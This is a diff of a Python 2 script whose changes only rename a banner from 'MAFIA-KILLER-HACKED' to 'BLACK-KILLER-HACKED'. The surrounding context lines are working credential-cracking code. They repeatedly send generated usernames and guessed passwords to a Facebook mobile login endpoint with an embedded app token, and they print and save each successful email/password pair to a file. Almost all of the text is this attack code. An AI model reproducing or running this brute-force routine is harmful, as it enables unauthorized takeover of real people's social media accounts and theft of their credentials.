@@ -402,7 +402,7 @@ def action():
                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                         q = json.load(data)
                                         if 'access_token' in q:
-                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2
+                                                print '\x1b[1;91mBLACK-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass2
                                                 okb = open('save/successfull.txt', 'a')
                                                 okb.write(k+c+user+pass2+'\n')
                                                 okb.close()
@@ -419,7 +419,7 @@ def action():
                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                         q = json.load(data)
                                                         if 'access_token' in q:
-                                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
+                                                                print '\x1b[1;91mBLACK-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass3
                                                                 okb = open('save/successfull.txt', 'a')
                                                                 okb.write(k+c+user+pass3+'\n')
                                                                 okb.close()
@@ -436,7 +436,7 @@ def action():
                                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                         q = json.load(data)
                                                                         if 'access_token' in q:
-                                                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
+                                                                                print '\x1b[1;91mBLACK-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass4
                                                                                 okb = open('save/successfull.txt', 'a')
                                                                                 okb.write(k+c+user+pass4+'\n')
                                                                                 okb.close()
@@ -453,7 +453,7 @@ def action():
                                                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                                         q = json.load(data)
                                                                                         if 'access_token' in q:
-                                                                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass5
+                                                                                                print '\x1b[1;91mBLACK-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass5
                                                                                                 okb = open('save/successfull.txt', 'a')
                                                                                                 okb.write(k+c+user+pass5+'\n')
                                                                                                 okb.close()
@@ -470,7 +470,7 @@ def action():
                                                                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                                                         q = json.load(data)
                                                                                                         if 'access_token' in q:
-                                                                                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass6
+                                                                                                                print '\x1b[1;91mBLACK-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass6
                                                                                                                 okb = open('save/successfull.txt', 'a')
                                                                                                                 okb.write(k+c+user+pass6+'\n')
                                                                                                                 okb.close()
@@ -487,7 +487,7 @@ def action():
                                                                                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                                                                         q = json.load(data)
                                                                                                                         if 'access_token' in q:
-                                                                                                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass7
+                                                                                                                                print '\x1b[1;91mBLACK-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass7
                                                                                                                                 okb = open('save/successfull.txt', 'a')
                                                                                                                                 okb.write(k+c+user+pass7+'\n')
                                                                                                                                 okb.close()
@@ -504,7 +504,7 @@ def action():
                                                                                                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                                                                                         q = json.load(data)
                                                                                                                                         if 'access_token' in q:
-                                                                                                                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass8
+                                                                                                                                                print '\x1b[1;91mBLACK-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass8
                                                                                                                                                 okb = open('save/successfull.txt', 'a')
                                                                                                                                                 okb.write(k+c+user+pass8+'\n')
                                                                                                                                                 okb.close()
@@ -521,7 +521,7 @@ def action():
                                                                                                                                                         data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                                                                                                         q = json.load(data)
                                                                                                                                                         if 'access_token' in q:
-                                                                                                                                                                print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass9
+                                                                                                                                                                print '\x1b[1;91mBLACK-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass9
                                                                                                                                                                 okb = open('save/successfull.txt', 'a')
                                                                                                                                                                 okb.write(k+c+user+pass9+'\n')
                                                                                                                                                                 okb.close()
@@ -538,7 +538,7 @@ def action():
                                                                                                                                                                          data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                                                                                                                          q = json.load(data)
                                                                                                                                                                          if 'access_token' in q:
-                                                                                                                                                                             print '\x1b[1;91mMAFIA-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass10
+                                                                                                                                                                             print '\x1b[1;91mBLACK-KILLER-HACKED√\x1b[1;97m-\x1b[1;94m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass10
                                                                                                                                                                              okb = open('save/successfull.txt', 'a')
                                                                                                                                                                              okb.write(k+c+user+pass10+'\n')
                                                                                                                                                                              okb.close()
